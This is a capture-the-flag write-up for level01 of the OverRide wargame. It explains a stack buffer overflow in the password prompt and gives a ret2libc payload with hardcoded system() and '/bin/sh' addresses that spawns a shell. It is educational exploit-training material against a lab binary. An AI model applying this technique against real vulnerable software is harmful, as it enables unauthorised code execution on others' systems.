# OverRide - Level01 Documentation

## 1. Vulnerability Analysis

The `level01` binary is vulnerable to a **Stack-Based Buffer Overflow** in the password processing sequence. While the program handles the username safely, it fails to enforce safe bounds when reading the password input.

### Vulnerability Breakdown

- **The Flaw:** The stack buffer allocated for the password (`buff2`) is only 64 bytes wide. However, `fgets(buff2, 100, 0)` allows up to 100 bytes of input.
- **The Impact:** By feeding a string longer than 80 bytes into the password prompt, we overwrite the saved Frame Pointer (`EBP`) and the Return Address (`EIP`), giving us total control over the execution flow.

## 2. Exploit Strategy: Ret2libc

Because ASLR is disabled on this machine and we want to avoid custom shellcode, we use a Return-to-libc (ret2libc) technique. We redirect `EIP` directly to the `system()` function already resident inside the C standard library, passing it the address of the `"/bin/sh"` string as an argument.

### Memory Mapping & Addresses

Through GDB analysis, the static locations of our required components were extracted and converted to Little Endian format:

- **`system()` Address:** `0xf7e6aed0`
  - Little Endian: `\xd0\xae\xe6\xf7`
- **`"/bin/sh"` String:** `0xf7f897ec`
  - Little Endian: `\xec\x97\xf8\xf7`
- **Junk Return Pointer** (`exit` placeholder): `0x61616161` (`aaaa`)

### Stack Frame Alignment

To build a functional 32-bit execution frame on the stack, the payload must look like a standard function call:

```
[ 80 Bytes Padding ] + [ system() Address ] + [ Dummy Ret Address ] + [ "/bin/sh" Address ]
```

## 3. Weaponization & Execution

The binary processes input sequentially: it demands a valid username (`dat_wil`) followed by a newline character (`\n`) before it exposes the vulnerable password buffer.

We chain the valid username and our exploit payload together, piping the output alongside `cat` to keep the spawned shell's standard input stream interactive.

```bash
(python -c 'print "dat_wil\n" + "a" * 80 + "\xd0\xae\xe6\xf7" + "\x61\x61\x61\x61" + "\xec\x97\xf8\xf7"'; cat) | ./level01
```